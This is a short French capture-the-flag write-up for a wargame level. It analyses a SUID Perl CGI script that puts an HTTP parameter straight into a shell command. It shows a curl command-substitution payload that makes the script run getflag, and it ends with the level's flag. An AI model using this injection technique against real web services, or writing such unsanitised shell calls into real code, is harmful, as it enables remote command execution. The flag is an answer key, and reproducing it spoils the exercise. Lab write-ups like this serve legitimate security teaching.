## LEVEL04

- Dans ce level, un script perl présent dans le home de level04: 

```bash
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Comme dans le level precedent le bit SUID est activé et le propriétaire du fichier est flag04.  

- En faisant cat dessus on peut voir : 

```bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
- Il récupère un paramètre HTTP x et l’insère sans aucune protection dans une commande shell :
```bash
`echo $y 2>&1`;
```

Les backticks exécutent une commande via /bin/sh.
Le paramètre utilisateur est donc interprété par le shell.  
Le script n’exécute qu’un echo et n'est pas modifiable a cause des droits readonly, mais le shell permet la substitution de commande.
Il est donc possible de faire exécuter une commande avant echo et d’en afficher la sortie.


## EXPLOITATION

Il suffit d'executer getflag en substitution de commande, ce qui permetra a echo d'afficher le resultat.  
- Les guillemets simples sont indispensables afin d’empêcher l’expansion locale par le shell :
```bash
curl 'http://localhost:4747?x=$(/bin/getflag)'
```

## FLAG 

- ne2searoevaevoem4ov4ar8ap
